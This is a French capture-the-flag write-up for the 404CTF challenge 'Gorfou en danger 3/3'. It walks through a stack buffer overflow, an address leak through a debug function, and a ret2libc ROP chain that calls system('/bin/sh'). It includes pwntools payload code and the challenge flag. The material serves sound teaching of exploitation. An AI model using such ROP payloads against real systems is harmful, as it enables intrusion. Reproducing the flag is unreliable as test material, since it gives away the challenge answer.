# Writeup pour `Gorfou en danger 3/3`

Auteur : *Pwnsard*  
Difficulté : *Facile*

### Notions prérequises :
- Fonctionnement d'une stackframe
- Buffer overflow
- Return Oriented Programming
- Protections de base

### Protections :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RUNPATH     43 Symbols	  No	0		2		chall
```

### Principe

Il s'agit d'un buffer overflow basique pour faire un **`ret2libc`** sur un buffer de la stack.  
Le code est strictement identique à celui du challenge précédent. La seule différence est que, cette fois, une protection en plus (NX) rend la stack non exécutable. On ne peut donc plus utiliser un shellcode, il faut effectuer une `ROPchain`. (Cette solution donc fonctionne également pour le challenge précédent)

Dans cette partie du code, il y a toujours un overflow evident de 0x30 bytes :

```C
char command[0x100]; 
printf("> ");
read(0, command, 0x130);
```

On a donc le contrôle du flow d'exécution (il n'y a même pas besoin de leaker un canary), il nous suffit désormais de connaître l'adresse de la libc (qui est la librairie standard qui fournit pleins de fonction, comme printf par exemple) afin d'aller éxecuter la fonction `system` qui permet l'exécution de programmes externes. En exéctuant `system("/bin/sh")` on obtient un shell.
Comme dans le challenge précédent, il y a une fonction qui permet de trouver très facilement l'adresse de la libc dans la mémoire.

```C
void debug_info(void) { 
    // our very own "info proc map"
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);
    return;
}
```

La méthode est la même, en envoyant le payload
```python
r.send(b"A" * (0x100 + 8) + p64(exe.symbols['debug_info']) + p64(exe.symbols['take_command']))
```
on réécrit le saved rip avec l'adresse de debug_info, qui nous affiche les adresses. Puis une fois debug_info exécutée, on retourne dans `take_command`, pour exécuter un dernier payload allant exécuter une ROPchain qui va lancer system. Le buffer overflow est suffisament long pour contenir toute notre ROPchain.

```python
rop = ROP(libc)
ret_gadget = (rop.find_gadget(['ret']))[0]
pop_rdi_gadget = (rop.find_gadget(['pop rdi', 'ret']))[0]
binsh = libc.address + 0x1b1ece
system = libc.address + 0x2edb0

payload = b"A" * 0x108
payload += p64(ret_gadget)
payload += p64(pop_rdi_gadget)
payload += p64(binsh)
payload += p64(system)

r.send(payload)
```

### Script de résolution :

Voir `solve.py`

### Flag : 

`404CTF{FELiC174TI0nS_!_cE_N_E$T_QUe_Le_DebUT_C0NTiNU32_À_4pPREnDR3_l3_pWn}`